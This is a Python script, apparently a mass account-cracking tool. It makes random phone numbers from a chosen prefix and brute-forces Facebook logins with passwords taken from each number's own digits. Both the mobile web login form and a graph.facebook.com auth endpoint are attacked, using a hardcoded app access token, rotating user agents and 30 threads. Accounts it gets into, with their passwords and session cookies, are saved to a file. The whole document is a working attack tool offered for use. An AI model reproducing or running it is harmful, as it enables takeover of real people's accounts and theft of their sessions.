import re, time,random,os,sys,string
from concurrent.futures import ThreadPoolExecutor as tdp
try:
    import requests as r
except:
    os.system("pip install requests")


ugen=open("r-ua.txt","r").read().splitlines()

#e="100024864368249"

#p="941186"
n=0
ok=0
cp=0
def c(e,pw):
  global n,cp,ok
  sys.stdout.write(f"\r\033[1;32mCHECKED-{n} |CP-{cp} | OK-{ok}\033[0m")
  sys.stdout.flush()
  status=0
  for p in pw:
     
    #print(f"for {e}-{p}")
    s=r.Session()
    ua=random.choice(ugen)
    s.headers.update({'User-Agent':ua})
    fb=s.get("https://d.facebook.com")
    c1=";".join(k+"="+v for k,v in dict(s.cookies).items())
    #print(s.headers)
    #print(c1)
    hd1={
        'user-agent':ua
    }
    s.headers.update(hd1)
    rt=s.get("https://d.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
    rs=rt.text
    #open("/sdcard/e.html","w").write(rs)
    #print(rt)
    d= {
            "lsd":re.search('name="lsd" value="(.*?)"', str(rs)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(rs)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(rs)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(rs)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":e,
            "pass":p,
           "login":"Log In"
          }
    hd={
"authority": "d.facebook.com",
"method": "POST",
#"path": "/?tbua=1",
"scheme": "https",
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-encoding": "gzip, deflate, br",
"accept-language": "en-US,en;q=0.9",
"cache-control": "max-age=0",
#cookie: sb=ZZSmY3MeGBoUQGwRYUyxoK8S; datr=ZZSmYxVfXZE4d7ZeITyN1zZn; c_user=100088418937096; xs=33%3AJzMFYMhAzYX4jg%3A2%3A1671861496%3A-1%3A-1; fr=00aIcvweHilBtCkt0.AWVfy_UWaaZSxYEBpHqAs3leHj4.BjppRl.aS.AAA.0.0.BjppT6.AWXrK0CmeIw; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1671861507032%2C%22v%22%3A1%7D; m_page_voice=100088418937096; m_pixel_ratio=1; wd=971x620
"referer": "https://d.facebook.com/",
'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent':ua #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54'
}
    def sub():
        global cp,ok
        nonlocal status
        try:
                x=s.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8",data=d,headers=hd
              
                ).text
            
                #open("/sdcard/e.html","w").write(x)
                #print(s.cookies)
                dc=dict(s.cookies)
                coki=";".join([k+"="+v for k,v in dc.items()])
                #print(coki)
                
                #print(cv)
                
                #print(s.cookies)
                x=str(s.cookies)
                #print(f"Running {e} {p}")
                if "checkpoint" in x:
                    cp+=1
                    cv=dc["checkpoint"][13:28]
                    print(f"\u001b[1;36mCP\n{e}-{cv} - {p}\u001b[0m")
                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p}\n")
                    status=1
                    
                    
                elif "c_user" in x:
                    ok+=1
                    cv=dc["c_user"]
                    print(f"\u001b[1;32mOk\n{e}-{cv} - {p}\u001b[0m")
                    print("\u001b[1;94m"+coki+"\u001b[0m\n\n")
                    open("sp.txt","a").write(f"{e} {cv} {p} -OK\n")
                    status=1
                    
        except Exception as er:
                print(er)
                print("\n"*3)
                time.sleep(15)
                sub()
        
    sub()
    if status==1:
        break
  n+=1
  
  
#API- method


def generate_ugent():
    versi_android = random.randint(4,12)
    versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    versi_app = random.randint(410000000,499999999)
    ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
    return ugent
nn=0
def napi(user,pw):
    global nn
    print(f"{nn} [{user} {pw}]",end="\r")
    ses=r.Session()
    params = {
        "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
        "sdk_version": {random.randint(1,26)}, 
        "email": user,
        "locale": "ja_JP",
        "password": pw,
        "sdk": "android",
        "generate_session_cookies": "1",
        "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
    }
    
    headers = {
        "Host": "graph.facebook.com",
        "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "user-agent": generate_ugent(),
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"
        
    }
    post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
    
    if "session_key" in post.text:
        print(f"OK -{user}-{pw}")
    elif "User must verify their account" in post.text:
        print(f"Cp -{user}-{pw}")
    nn+=1








os.system("clear")
codes=[300, 301, 302, 303, 304, 305, 306, 307, 308, 309,310, 311, 312, 313, 314, 315, 316, 317, 318,320, 321, 322, 323, 324, 325, 326,330, 331, 332, 333, 334, 335, 336, 337,340, 341, 342, 343, 344, 345, 346, 347, 348, 349 ,355,364]
code=input("Code(0305,0303,0345):")
#305#random.choice(codes)
lim=int(input("Limit:"))
pslen=int(input("Password Length (6-11):"))
nums=[]
for i in range(lim):
    nums.append(f"{code}{''.join(random.choice(string.digits) for _ in range(7))}")
#print(nums)



            
with tdp(max_workers=30) as t:
    for i in nums:
        pws=[i[(11-n):] for n in range(6,pslen+1)]
        t.submit(c,i,pws)








